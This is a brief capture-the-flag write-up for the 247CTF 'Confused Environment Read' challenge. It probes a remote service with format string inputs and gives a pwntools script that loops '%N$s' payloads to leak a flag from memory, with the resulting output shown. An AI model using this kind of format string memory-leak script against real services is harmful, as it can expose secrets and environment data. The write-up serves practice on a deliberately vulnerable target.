Confused Environment Read

Format String Bug vulnerability

```
->$ nc 6967c3b94f3fac03.247ctf.com 50338
Argh, I can't see who you are!
What's your name again?
test
Oh, that's right! Welcome back test!
Argh, I can't see who you are!
What's your name again?
%1$p
Oh, that's right! Welcome back 0x5661d877!
Argh, I can't see who you are!
What's your name again?
%1$f
Oh, that's right! Welcome back -923193573382554223004110495288408097617880105363594090957638310987156657512082357050505920808568513513631165881994423673335396139585650754629198603969169231763939606682749919361909069377011366639851934358024633715465740528577752349229941718214037025099267135557601329152.000000!
```
%p -> pointer
%f -> float
%s -> strings
%l -> long
%x -> hex

this problems are easy so maybe simply,
I tryied the %s 

create the script:

```
#!/usr/bin/python3

from pwn import *

host,port = <host>,<port>


for i in range(200):

    r = remote(host,port)
    payload = f"%{str(i)}$s"

    r.recv()
    r.sendline(payload.encode())
    res = r.recv()
    r.close()

    if b"247CTF" in res:
        print(res)
        break
```

```
->$ ./exploit.py 
```

```
[+] Opening connection to 6967c3b94f3fac03.247ctf.com on port 50338: Done
[*] Closed connection to 6967c3b94f3fac03.247ctf.com port 50338
b"Oh, that's right! Welcome back FLAG=247CTF{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}!\nArgh, I can't see who you are!\nWhat's your name again?\n"
```










